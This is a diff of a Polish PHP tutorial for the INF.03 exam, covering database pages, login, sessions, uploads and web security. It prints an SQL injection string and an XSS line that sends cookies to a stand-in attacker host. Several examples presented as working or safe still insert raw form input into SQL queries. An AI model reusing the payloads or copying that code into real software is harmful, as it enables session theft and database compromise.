+        <h2>Lista projektów</h2>
+        
+        <?php
+        $conn = mysqli_connect("localhost", "root", "", "firma");
+        mysqli_set_charset($conn, "utf8");
+        
+        $sql = "SELECT projekty.nazwa, projekty.budzet, projekty.data_rozpoczecia,
+                       pracownicy.imie, pracownicy.nazwisko
+                FROM projekty
+                INNER JOIN pracownicy ON projekty.pracownik_id = pracownicy.id
+                ORDER BY projekty.data_rozpoczecia DESC";
+        
+        $wynik = mysqli_query($conn, $sql);
+        
+        if (mysqli_num_rows($wynik) > 0) {
+            echo "<table>";
+            echo "<tr>";
+            echo "<th>Nazwa projektu</th>";
+            echo "<th>Budżet</th>";
+            echo "<th>Data rozpoczęcia</th>";
+            echo "<th>Pracownik</th>";
+            echo "</tr>";
+            
+            while ($projekt = mysqli_fetch_array($wynik)) {
+                echo "<tr>";
+                echo "<td>" . $projekt["nazwa"] . "</td>";
+                echo "<td>" . number_format($projekt["budzet"], 2, ',', ' ') . " zł</td>";
+                echo "<td>" . $projekt["data_rozpoczecia"] . "</td>";
+                echo "<td>" . $projekt["imie"] . " " . $projekt["nazwisko"] . "</td>";
+                echo "</tr>";
+            }
+            
+            echo "</table>";
+        } else {
+            echo "<p>Brak projektów w bazie</p>";
+        }
+        
+        mysqli_close($conn);
+        ?>
+    </section>
+    
+    <footer>
+        <p>Portal Firmowy &copy; 2025</p>
+    </footer>
+</body>
+</html>
+```
+
+**dodaj.php:**
 ```php
 <?php
-// NIEBEZPIECZNE - podatne na XSS
-$input = $_GET['komentarz'];
-echo "Twój komentarz: " . $input;  // NIGDY tak nie rób!
-
-// BEZPIECZNE - zawsze sanityzuj dane wyjściowe
-$input = $_GET['komentarz'];
-echo "Twój komentarz: " . htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $conn = mysqli_connect("localhost", "root", "", "firma");
+    mysqli_set_charset($conn, "utf8");
+    
+    $nazwa = $_POST["nazwa"];
+    $budzet = $_POST["budzet"];
+    $pracownik_id = $_POST["pracownik_id"];
+    
+    $sql = "INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
+            VALUES ('$nazwa', $budzet, CURRENT_DATE(), $pracownik_id)";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Projekt dodany pomyślnie!<br>";
+        echo "<a href='index.php'>Powrót do listy</a>";
+    } else {
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+}
 ?>
 ```
 
-### Zabezpieczenie przed CSRF (Cross-Site Request Forgery)
-
-```php
-<?php
-// Na stronie z formularzem
-session_start();
-
-// Generowanie tokenu CSRF
-if (empty($_SESSION['csrf_token'])) {
-    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+**styl.css:**
+```css
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f4;
 }
 
-// Dodanie ukrytego pola z tokenem w formularzu
-echo '<form method="POST" action="process.php">
-      <input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">
-      <!-- Inne pola formularza -->
-      <button type="submit">Wyślij</button>
-      </form>';
-
-// Na stronie przetwarzającej formularz (process.php)
-session_start();
-
-// Sprawdzenie tokenu CSRF
-if (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token']) ||
-    $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    die("❌ Weryfikacja CSRF nieudana!");
+header {
+    background-color: #333;
+    color: white;
+    padding: 20px;
+    text-align: center;
 }
 
-// Jeśli token jest poprawny, przetwórz dane formularza
-// ...
-?>
+header img {
+    width: 100px;
+}
+
+section {
+    margin: 20px;
+    padding: 20px;
+    background-color: white;
+    border-radius: 5px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+}
+
+th, td {
+    border: 1px solid #ddd;
+    padding: 10px;
+    text-align: left;
+}
+
+th {
+    background-color: #333;
+    color: white;
+}
+
+tr:hover {
+    background-color: #f5f5f5;
+}
+
+input, select, button {
+    padding: 8px;
+    margin: 5px 0;
+    width: 100%;
+    max-width: 400px;
+}
+
+button {
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #45a049;
+}
+
+footer {
+    background-color: #333;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+}
 ```
 
-### Bezpieczne przechowywanie haseł
+### **Checklist - Co musisz zrobić na egzaminie:**
 
-```php
-<?php
-// NIGDY nie przechowuj jawnych haseł!
-$plain_password = "MojeHaslo123"; // Od użytkownika
+#### **Przed egzaminem:**
+- [ ] Sprawdź czy działa XAMPP (Apache i MySQL)
+- [ ] Otwórz phpMyAdmin (`localhost/phpmyadmin`)
+- [ ] Przygotuj edytor kodu (VS Code, Notepad++)
+- [ ] Sprawdź czy masz dostęp do GIMP/Photoshop
 
-// Hashowanie przy rejestracji
-$hash = password_hash($plain_password, PASSWORD_DEFAULT);
+#### **Podczas egzaminu - Baza danych:**
+- [ ] Zaimportuj udostępnioną bazę SQL
+- [ ] Wykonaj każde zapytanie w phpMyAdmin
+- [ ] Zrób zrzut ekranu każdego wyniku (PNG/JPG)
+- [ ] Zapisz wszystkie zapytania do `kwerendy.txt`
+- [ ] Sprawdź czy nazwy plików są poprawne
 
-// Zapis hashu do bazy zamiast jawnego hasła
-$sql = "INSERT INTO users (username, password_hash) VALUES (?, ?)";
-$stmt = $conn->prepare($sql);
-$stmt->bind_param("ss", $username, $hash);
-$stmt->execute();
+#### **Podczas egzaminu - Strona:**
+- [ ] Stwórz strukturę HTML5 (header, section, footer)
+- [ ] Dodaj zewnętrzny plik CSS (`styl.css`)
+- [ ] Połącz PHP z bazą (`mysqli_connect`)
+- [ ] Wyświetl dane w tabeli (pętla `while`)
+- [ ] Dodaj formularz z obsługą POST
+- [ ] Sprawdź czy formularz działa
+- [ ] ZAMKNIJ połączenia (`mysqli_close`)
 
-// Przy logowaniu
-$user_input = "MojeHaslo123"; // Od użytkownika
-$hash_from_db = "..."; // Hash pobrany z bazy danych
+#### **Podczas egzaminu - Grafika:**
+- [ ] Otwórz plik w GIMP/Photoshop
+- [ ] Wykonaj wymagane operacje
+- [ ] Zapisz w odpowiednim formacie
+- [ ] Sprawdź wymiary i nazwę pliku
 
-if (password_verify($user_input, $hash_from_db)) {
-    echo "✅ Hasło poprawne - logowanie udane";
-} else {
-    echo "❌ Niepoprawne hasło";
-}
-?>
-```
+#### **Przed oddaniem:**
+- [ ] Sprawdź czy wszystkie pliki są w folderze
+- [ ] Przetestuj stronę w przeglądarce
+- [ ] Sprawdź czy formularz działa
+- [ ] Sprawdź czy wszystkie połączenia są zamknięte
+- [ ] Zrób backup na dysk USB
 
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px;">
-<h4 style="margin-top: 0;">💡 Wskazówki dot. haseł</h4>
-<ul style="color: #333333;">
-<li>Funkcja <code>password_hash()</code> automatycznie dodaje sól (salt)</li>
-<li>W miarę wzrostu mocy obliczeniowych, algorytmy są automatycznie aktualizowane</li>
-<li>Nigdy nie próbuj tworzyć własnych algorytmów hashowania haseł</li>
-<li>Rozważ dodanie dwuskładnikowego uwierzytelniania (2FA) dla krytycznych systemów</li>
-</ul>
-</div>
+### **Typowe błędy na egzaminie - UNIKAJ ICH!**
 
-### Lista kontrolna bezpieczeństwa PHP
-
-<table>
-  <tr>
-    <td width="30px" align="center">✅</td>
-    <td><b>Aktualizuj regularnie PHP i wszystkie biblioteki</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Używaj Prepared Statements dla wszystkich zapytań SQL</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Waliduj i sanityzuj wszystkie dane wejściowe</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Używaj htmlspecialchars() dla wszystkich danych wyjściowych</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Hashuj hasła z password_hash() i password_verify()</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Stosuj tokeny CSRF dla wszystkich formularzy</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Ustaw flagi httponly i secure dla ciasteczek</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Dodaj limit liczby plików przesyłanych przez użytkownika</b></td>
-  </tr>
-  <tr>
-    <td align="center">✅</td>
-    <td><b>Regularnie aktualizuj skrypty i biblioteki</b></td>
-  </tr>
-</table>
+❌ **Brak `mysqli_close()`** - STRATA PUNKTÓW!
+❌ **Niepoprawna nazwa bazy danych** - strona nie działa
+❌ **Brak pliku `kwerendy.txt`** - strata punktów
+❌ **Brak zrzutów ekranu** - strata punktów
+❌ **Błędy w zapytaniach SQL** - sprawdź składnię!
+❌ **Niezabezpieczone dane** - używaj `htmlspecialchars()`
+❌ **Brak testowania** - sprawdź czy wszystko działa!
 
 ---
 
-## **Podsumowanie - Twoja droga z PHP**
+## **12. Sesje i ciasteczka**
 
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<h4 style="margin-top: 0;">🎓 Gratulacje!</h4>
-<p style="color: #333333;">Przeszedłeś przez kompleksowy przewodnik po PHP! Zdobyta wiedza pozwoli Ci tworzyć dynamiczne strony internetowe i aplikacje webowe.</p>
-</div>
+### **Sesje - przechowywanie danych użytkownika**
 
-### Co już umiesz:
+Sesje pozwalają przechowywać dane na serwerze dla konkretnego użytkownika.
 
-<table>
-  <tr>
-    <th>Kategoria</th>
-    <th>Zdobyte umiejętności</th>
-  </tr>
-  <tr>
-    <td>Podstawy PHP</td>
-    <td>Składnia, zmienne, operatory, instrukcje sterujące</td>
-  </tr>
-  <tr>
-    <td>Funkcje i organizacja kodu</td>
-    <td>Definiowanie funkcji, parametry, zwracanie wartości</td>
-  </tr>
-  <tr>
-    <td>Formularze</td>
-    <td>Odbieranie i przetwarzanie danych, walidacja</td>
-  </tr>
-  <tr>
-    <td>Bazy danych</td>
-    <td>Połączenia MySQL, operacje CRUD, bezpieczne zapytania</td>
-  </tr>
-  <tr>
-    <td>Zarządzanie stanem</td>
-    <td>Sesje, ciasteczka, przechowywanie danych użytkownika</td>
-  </tr>
-  <tr>
-    <td>Pliki i upload</td>
-    <td>Praca z plikami, odbieranie plików od użytkowników</td>
-  </tr>
-  <tr>
-    <td>Bezpieczeństwo</td>
-    <td>Ochrona przed XSS, CSRF, SQL Injection</td>
-  </tr>
-</table>
+```php
+<?php
+    // ZAWSZE na początku pliku!
+    session_start();
+    
+    // Zapisywanie danych w sesji
+    $_SESSION["uzytkownik"] = "Jan";
+    $_SESSION["zalogowany"] = true;
+    $_SESSION["rola"] = "admin";
+    
+    echo "Sesja rozpoczęta";
+?>
+```
 
-### Następne kroki - Dalsza nauka:
+**Odczyt danych z sesji:**
 
-<div style="display: flex; flex-wrap: wrap; gap: 15px;">
+```php
+<?php
+    session_start();
+    
+    if (isset($_SESSION["zalogowany"]) && $_SESSION["zalogowany"] === true) {
+        echo "Witaj, " . $_SESSION["uzytkownik"] . "!";
+        echo "Twoja rola: " . $_SESSION["rola"];
+    } else {
+        echo "Nie jesteś zalogowany";
+    }
+?>
+```
 
-<div style="flex: 1; min-width: 200px; background-color: #EDE7F6; border-radius: 5px; padding: 10px;">
-<h4 style="margin-top: 0;">🧩 Paradygmaty i wzorce</h4>
-<ul style="color: #333333;">
-<li>Programowanie obiektowe w PHP</li>
-<li>Wzorce projektowe (MVC, Singleton, Factory)</li>
-<li>Architektura aplikacji</li>
-</ul>
-</div>
+**Usuwanie danych z sesji:**
 
-<div style="flex: 1; min-width: 200px; background-color: #E8EAF6; border-radius: 5px; padding: 10px;">
-<h4 style="margin-top: 0;">🛠️ Narzędzia i ekosystem</h4>
-<ul style="color: #333333;">
-<li>Composer (zarządzanie zależnościami)</li>
-<li>Frameworki (Laravel, Symfony)</li>
-<li>Systemy szablonów (Twig, Blade)</li>
-</ul>
-</div>
+```php
+<?php
+    session_start();
+    
+    // Usuń konkretną zmienną
+    unset($_SESSION["uzytkownik"]);
+    
+    // Usuń wszystkie dane sesji
+    session_unset();
+    
+    // Zniszcz sesję całkowicie
+    session_destroy();
+?>
+```
 
-<div style="flex: 1; min-width: 200px; background-color: #E0F7FA; border-radius: 5px; padding: 10px;">
-<h4 style="margin-top: 0;">🔌 Integracje i API</h4>
-<ul style="color: #333333;">
-<li>Tworzenie i konsumpcja API REST</li>
-<li>Integracje z serwisami zewnętrznymi</li>
-<li>JSON Web Tokens (JWT)</li>
-</ul>
-</div>
+### **Kompletny system logowania**
 
-</div>
+**login.html:**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Logowanie</title>
+</head>
+<body>
+    <h2>Panel logowania</h2>
+    
+    <form method="POST" action="login.php">
+        <label>Login:</label>
+        <input type="text" name="login" required><br><br>
+        
+        <label>Hasło:</label>
+        <input type="password" name="haslo" required><br><br>
+        
+        <button type="submit">Zaloguj</button>
+    </form>
+</body>
+</html>
+```
 
-### Złote zasady programisty PHP:
+**login.php:**
+```php
+<?php
+    session_start();
+    
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        // Połączenie z bazą (styl proceduralny)
+        $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+        
+        if (!$conn) {
+            die("Błąd połączenia: " . mysqli_connect_error());
+        }
+        
+        mysqli_set_charset($conn, "utf8");
+        
+        $login = $_POST["login"];
+        $haslo = $_POST["haslo"];
+        
+        // Pobierz użytkownika z bazy
+        $sql = "SELECT id, login, haslo, rola FROM uzytkownicy WHERE login='$login'";
+        $wynik = mysqli_query($conn, $sql);
+        
+        if (mysqli_num_rows($wynik) === 1) {
+            $uzytkownik = mysqli_fetch_array($wynik);
+            
+            // Sprawdź hasło (używając password_verify)
+            if (password_verify($haslo, $uzytkownik["haslo"])) {
+                // Poprawne logowanie
+                $_SESSION["zalogowany"] = true;
+                $_SESSION["user_id"] = $uzytkownik["id"];
+                $_SESSION["login"] = $uzytkownik["login"];
+                $_SESSION["rola"] = $uzytkownik["rola"];
+                
+                header("Location: panel.php");
+                exit();
+            } else {
+                echo "Błędne hasło";
+            }
+        } else {
+            echo "Użytkownik nie istnieje";
+        }
+        
+        mysqli_close($conn);
+    }
+?>
+```
 
-<div style="background-color: #FFF8E1; border-left: 5px solid #FFB300; margin: 20px 0; padding: 10px;">
-<h4 style="margin-top: 0;">🏆 Wskazówki od ekspertów</h4>
+**panel.php:**
+```php
+<?php
+    session_start();
+    
+    // Sprawdzenie czy zalogowany
+    if (!isset($_SESSION["zalogowany"]) || $_SESSION["zalogowany"] !== true) {
+        header("Location: login.html");
+        exit();
+    }
+?>
 
-<p><strong>DRY - Don't Repeat Yourself</strong><br>
-Unikaj powtarzania kodu. Jeśli widzisz ten sam kod w kilku miejscach, utwórz z niego funkcję.</p>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Panel użytkownika</title>
+</head>
+<body>
+    <h2>Witaj, <?php echo htmlspecialchars($_SESSION["login"]); ?>!</h2>
+    
+    <p>Jesteś zalogowany jako: <?php echo $_SESSION["rola"]; ?></p>
+    
+    <h3>Menu:</h3>
+    <ul>
+        <li><a href="profil.php">Mój profil</a></li>
+        <li><a href="ustawienia.php">Ustawienia</a></li>
+        <li><a href="logout.php">Wyloguj</a></li>
+    </ul>
+</body>
+</html>
+```
 
-<p><strong>KISS - Keep It Simple, Stupid</strong><br>
-Prostota jest kluczem do utrzymywalnego kodu. Unikaj nadmiernie skomplikowanych rozwiązań.</p>
+**logout.php:**
+```php
+<?php
+    session_start();
+    session_unset();
+    session_destroy();
+    header("Location: login.html");
+    exit();
+?>
+```
 
-<p><strong>YAGNI - You Aren't Gonna Need It</strong><br>
-Nie dodawaj funkcjonalności "na zapas". Implementuj tylko to, co jest potrzebne teraz.</p>
+### **Ciasteczka (Cookies)**
 
-<p><strong>Bezpieczeństwo przede wszystkim</strong><br>
-Zawsze zakładaj, że dane wejściowe od użytkowników są potencjalnie złośliwe.</p>
+Ciasteczka przechowują dane w przeglądarce użytkownika:
 
-<p><strong>Testuj swój kod</strong><br>
-Regularne testowanie pozwala wcześnie wykryć problemy i zapewnia jakość kodu.</p>
+```php
+<?php
+    // Ustawianie ciasteczka
+    // setcookie(nazwa, wartość, wygaśnięcie, ścieżka, domena, secure, httponly)
+    setcookie("uzytkownik", "Jan", time() + (86400 * 30), "/");  // 30 dni
+    
+    echo "Ciasteczko ustawione";
+?>
+```
 
-<p><strong>Dbaj o czytelność</strong><br>
-Kod jest czytany znacznie częściej niż pisany. Pisz go tak, jakbyś tłumaczył komuś swoje intencje.</p>
-</div>
+**Odczyt ciasteczka:**
 
-<div style="text-align: center; margin-top: 30px;">
-<h3>Powodzenia w Twojej przygodzie z PHP! 🚀</h3>
-<p><em>Pamiętaj, że najlepsza nauka to praktyka - zacznij tworzyć własne projekty!</em></p>
-</div>
+```php
+<?php
+    if (isset($_COOKIE["uzytkownik"])) {
+        echo "Witaj ponownie, " . $_COOKIE["uzytkownik"];
+    } else {
+        echo "To Twoja pierwsza wizyta";
+    }
+?>
+```
+
+**Usuwanie ciasteczka:**
+
+```php
+<?php
+    // Ustaw czas wygaśnięcia w przeszłości
+    setcookie("uzytkownik", "", time() - 3600, "/");
+    echo "Ciasteczko usunięte";
+?>
+```
+
+**Różnice: Sesje vs Ciasteczka**
+
+| Cecha | Sesje | Ciasteczka |
+|-------|-------|------------|
+| Gdzie przechowywane? | Na serwerze | W przeglądarce użytkownika |
+| Bezpieczeństwo | Wysokie | Niskie (użytkownik może modyfikować) |
+| Rozmiar | Praktycznie nieograniczony | Maks. 4KB |
+| Czas życia | Do zamknięcia przeglądarki | Można ustawić (dni, miesiące, lata) |
+| Użycie | Logowanie, koszyk, dane wrażliwe | Preferencje, język, "Zapamiętaj mnie" |
+
+---
+
+## **13. Upload plików**
+
+### **Formularz HTML**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Upload pliku</title>
+</head>
+<body>
+    <!-- WAŻNE: enctype="multipart/form-data" jest OBOWIĄZKOWY! -->
+    <form method="POST" action="upload.php" enctype="multipart/form-data">
+        <label>Wybierz plik:</label>
+        <input type="file" name="plik" required><br><br>
+        
+        <label>Opis:</label>
+        <input type="text" name="opis"><br><br>
+        
+        <button type="submit">Prześlij</button>
+    </form>
+</body>
+</html>
+```
+
+### **Podstawowy upload**
+
+```php
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["plik"])) {
+        
+        $nazwaPliku = $_FILES["plik"]["name"];
+        $tmpNazwa = $_FILES["plik"]["tmp_name"];
+        $rozmiar = $_FILES["plik"]["size"];
+        $blad = $_FILES["plik"]["error"];
+        
+        // Sprawdzenie czy nie było błędu
+        if ($blad === 0) {
+            
+            // Folder docelowy
+            $folder = "uploads/";
+            
+            // Utwórz folder jeśli nie istnieje
+            if (!file_exists($folder)) {
+                mkdir($folder, 0777, true);
+            }
+            
+            // Przeniesienie pliku
+            $sciezka = $folder . $nazwaPliku;
+            
+            if (move_uploaded_file($tmpNazwa, $sciezka)) {
+                echo "Plik przesłany pomyślnie: $nazwaPliku";
+            } else {
+                echo "Błąd podczas przesyłania pliku";
+            }
+            
+        } else {
+            echo "Wystąpił błąd przy przesyłaniu";
+        }
+    }
+?>
+```
+
+### **Upload z zabezpieczeniami (WAŻNE!)**
+
+```php
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["plik"])) {
+        
+        $plik = $_FILES["plik"];
+        $nazwaPliku = $plik["name"];
+        $tmpNazwa = $plik["tmp_name"];
+        $rozmiar = $plik["size"];
+        
+        // 1. Sprawdzenie rozszerzenia
+        $rozszerzenie = strtolower(pathinfo($nazwaPliku, PATHINFO_EXTENSION));
+        $dozwolone = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"];
+        
+        if (!in_array($rozszerzenie, $dozwolone)) {
+            die("❌ Niedozwolony typ pliku! Dozwolone: " . implode(", ", $dozwolone));
+        }
+        
+        // 2. Sprawdzenie rozmiaru (max 5MB)
+        $maxRozmiar = 5 * 1024 * 1024;  // 5MB w bajtach
+        
+        if ($rozmiar > $maxRozmiar) {
+            die("❌ Plik jest za duży! Maksymalny rozmiar: 5MB");
+        }
+        
+        // 3. Generowanie bezpiecznej nazwy pliku
+        $nowaNazwa = uniqid() . "_" . time() . "." . $rozszerzenie;
+        
+        // 4. Przeniesienie pliku
+        $folder = "uploads/";
+        $sciezka = $folder . $nowaNazwa;
+        
+        if (move_uploaded_file($tmpNazwa, $sciezka)) {
+            echo "✅ Plik przesłany pomyślnie!<br>";
+            echo "📂 Zapisano jako: $nowaNazwa";
+        } else {
+            echo "❌ Błąd podczas przesyłania pliku";
+        }
+    }
+?>
+```
+
+### **Upload wielu plików**
+
+```html
+<form method="POST" action="upload_multi.php" enctype="multipart/form-data">
+    <input type="file" name="pliki[]" multiple required><br><br>
+    <button type="submit">Prześlij pliki</button>
+</form>
+```
+
+```php
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["pliki"])) {
+        
+        $pliki = $_FILES["pliki"];
+        $iloscPlikow = count($pliki["name"]);
+        
+        for ($i = 0; $i < $iloscPlikow; $i++) {
+            
+            $nazwa = $pliki["name"][$i];
+            $tmpNazwa = $pliki["tmp_name"][$i];
+            $rozmiar = $pliki["size"][$i];
+            
+            if ($pliki["error"][$i] === 0) {
+                
+                // Walidacja (tak samo jak wcześniej)
+                $rozszerzenie = strtolower(pathinfo($nazwa, PATHINFO_EXTENSION));
+                $dozwolone = ["jpg", "jpeg", "png", "gif"];
+                
+                if (!in_array($rozszerzenie, $dozwolone)) {
+                    echo "❌ Pominięto $nazwa - niedozwolony typ<br>";
+                    continue;
+                }
+                
+                $nowaNazwa = uniqid() . "_" . $nazwa;
+                $sciezka = "uploads/" . $nowaNazwa;
+                
+                if (move_uploaded_file($tmpNazwa, $sciezka)) {
+                    echo "✅ Przesłano: $nazwa<br>";
+                }
+            }
+        }
+    }
+?>
+```
+
+---
+
+## **14. Bezpieczeństwo aplikacji**
+
+Bezpieczeństwo to NAJWAŻNIEJSZY aspekt tworzenia aplikacji PHP!
+
+### **SQL Injection - największe zagrożenie**
+
+**ŹLE - podatne na atak:**
+
+```php
+<?php
+    // ❌ NIGDY TAK NIE RÓB!
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    $login = $_POST["login"];
+    $sql = "SELECT * FROM uzytkownicy WHERE login = '$login'";
+    $wynik = mysqli_query($conn, $sql);
+    
+    // Atakujący może wpisać: admin' OR '1'='1
+    // Zapytanie stanie się: SELECT * FROM uzytkownicy WHERE login = 'admin' OR '1'='1'
+    // To zaloguje pierwszego użytkownika bez hasła!
+    
+    mysqli_close($conn);
+?>
+```
+
+**DOBRZE - bezpieczne (dla egzaminu INF.03):**
+
+**UWAGA:** Na egzaminie INF.03 zwykle NIE wymagają Prepared Statements, ale musisz używać podstawowych zabezpieczeń:
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    mysqli_set_charset($conn, "utf8");
+    
+    // Zabezpieczenie danych przed SQL Injection
+    $login = mysqli_real_escape_string($conn, $_POST["login"]);
+    $haslo = mysqli_real_escape_string($conn, $_POST["haslo"]);
+    
+    $sql = "SELECT * FROM uzytkownicy WHERE login='$login'";
+    $wynik = mysqli_query($conn, $sql);
+    
+    if (mysqli_num_rows($wynik) > 0) {
+        $uzytkownik = mysqli_fetch_array($wynik);
+        // Sprawdzanie hasła...
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**mysqli_real_escape_string()** - zabezpiecza przed SQL Injection (WAŻNE na egzaminie!)
+
+### **XSS (Cross-Site Scripting) - wstrzykiwanie kodu**
+
+**ŹLE:**
+
+```php
+<?php
+    // ❌ NIEBEZPIECZNE!
+    $komentarz = $_POST["komentarz"];
+    echo $komentarz;
+    
+    // Atakujący może wpisać: <script>alert('XSS')</script>
+    // Lub: <script>document.location='http://zly-serwer.com?cookie='+document.cookie</script>
+?>
+```
+
+**DOBRZE:**
+
+```php
+<?php
+    // ✅ BEZPIECZNE - htmlspecialchars()
+    $komentarz = htmlspecialchars($_POST["komentarz"], ENT_QUOTES, 'UTF-8');
+    echo $komentarz;
+    
+    // Tagi HTML zostaną zamienione na tekst:
+    // <script> → &lt;script&gt;
+?>
+```
+
+### **Hashowanie haseł - NIGDY w czystej postaci!**
+
+**ŹLE:**
+
+```php
+<?php
+    // ❌ NIGDY tak nie przechowuj haseł!
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    $haslo = $_POST["haslo"];
+    $sql = "INSERT INTO uzytkownicy (login, haslo) VALUES ('$login', '$haslo')";
+    mysqli_query($conn, $sql);
+    // Hasło w bazie: "mojhaslo123"
+    
+    mysqli_close($conn);
+?>
+```
+
+**DOBRZE:**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    mysqli_set_charset($conn, "utf8");
+    
+    // ✅ Rejestracja - hashowanie hasła
+    $login = $_POST["login"];
+    $haslo = $_POST["haslo"];
+    $hashHasla = password_hash($haslo, PASSWORD_DEFAULT);
+    
+    $sql = "INSERT INTO uzytkownicy (login, haslo) VALUES ('$login', '$hashHasla')";
+    mysqli_query($conn, $sql);
+    // Hasło w bazie: "$2y$10$..." (zahashowane)
+    
+    mysqli_close($conn);
+    
+    // ✅ Logowanie - weryfikacja hasła
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    $login = $_POST["login"];
+    $haslo = $_POST["haslo"];
+    
+    $sql = "SELECT id, haslo FROM uzytkownicy WHERE login='$login'";
+    $wynik = mysqli_query($conn, $sql);
+    $uzytkownik = mysqli_fetch_array($wynik);
+    
+    if ($uzytkownik && password_verify($haslo, $uzytkownik["haslo"])) {
+        echo "Zalogowano pomyślnie!";
+        $_SESSION["user_id"] = $uzytkownik["id"];
+    } else {
+        echo "Błędne dane logowania";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **CSRF (Cross-Site Request Forgery) - fałszywe żądania**
+
+```php
+<?php
+    session_start();
+    
+    // Generowanie tokenu CSRF
+    if (empty($_SESSION["csrf_token"])) {
+        $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
+    }
+?>
+
+<!-- Formularz z tokenem CSRF -->
+<form method="POST" action="usuń_konto.php">
+    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+    <button type="submit">Usuń konto</button>
+</form>
+```
+
+```php
+<?php
+    // usuń_konto.php
+    session_start();
+    
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        // Weryfikacja tokenu CSRF
+        if (!isset($_POST["csrf_token"]) || $_POST["csrf_token"] !== $_SESSION["csrf_token"]) {
+            die("❌ Nieprawidłowy token CSRF!");
+        }
+        
+        // Token prawidłowy - wykonaj akcję
+        echo "Konto usunięte";
+    }
+?>
+```
+
+### **Walidacja danych**
+
+```php
+<?php
+    // Walidacja email
+    $email = $_POST["email"];
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        die("Nieprawidłowy email");
+    }
+    
+    // Walidacja URL
+    $strona = $_POST["strona"];
+    if (!filter_var($strona, FILTER_VALIDATE_URL)) {
+        die("Nieprawidłowy URL");
+    }
+    
+    // Walidacja liczby całkowitej
+    $wiek = $_POST["wiek"];
+    if (!filter_var($wiek, FILTER_VALIDATE_INT) || $wiek < 1 || $wiek > 150) {
+        die("Nieprawidłowy wiek");
+    }
+    
+    // Czyszczenie tekstu (usunięcie tagów HTML)
+    $opis = strip_tags($_POST["opis"]);
+    
+    // Walidacja długości
+    $imie = trim($_POST["imie"]);
+    if (strlen($imie) < 3 || strlen($imie) > 50) {
+        die("Imię musi mieć 3-50 znaków");
+    }
+?>
+```
+
+### **Checklist bezpieczeństwa**
+
+| ✅ | Zasada |
+|---|--------|
+| ✅ | Używaj **Prepared Statements** przy zapytaniach SQL |
+| ✅ | Używaj **htmlspecialchars()** przy wyświetlaniu danych użytkownika |
+| ✅ | Hashuj hasła funkcją **password_hash()** |
+| ✅ | Waliduj WSZYSTKIE dane wejściowe |
+| ✅ | Używaj tokenów **CSRF** w formularzach |
+| ✅ | Sprawdzaj rozszerzenia i rozmiary uploadowanych plików |
+| ✅ | Używaj HTTPS w produkcji |
+| ✅ | Ograniczaj uprawnienia użytkownika bazy danych |
+| ✅ | Nie wyświetlaj szczegółowych błędów użytkownikom |
+| ✅ | Regularnie aktualizuj PHP i biblioteki |
+
+---
+
+## **15. Najczęstsze błędy i rozwiązywanie problemów**
+
+### **1. Brak session_start()**
+
+**Błąd:**
+```php
+<?php
+    $_SESSION["user"] = "Jan";  // ❌ BŁĄD: Warning: Undefined variable $_SESSION
+?>
+```
+
+**Rozwiązanie:**
+```php
+<?php
+    session_start();  // ✅ ZAWSZE na początku
+    $_SESSION["user"] = "Jan";
+?>
+```
+
+### **2. Nagłówki wysłane przed header()**
+
+**Błąd:**
+```php
+<?php
+    echo "Coś";  // ❌ Już wysłano dane
+    header("Location: strona.php");  // BŁĄD: Cannot modify header information
+?>
+```
+
+**Rozwiązanie:**
+```php
+<?php
+    header("Location: strona.php");  // ✅ Przed jakimkolwiek echo/HTML
+    exit();
+?>
+```
+
+### **3. Niezamknięte połączenie z bazą**
+
+**Błąd:**
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "baza");
+    // ... kod ...
+    // ❌ Brak zamknięcia! STRACISZ PUNKTY NA EGZAMINIE!
+?>
+```
+
+**Rozwiązanie:**
+```php
+<?php
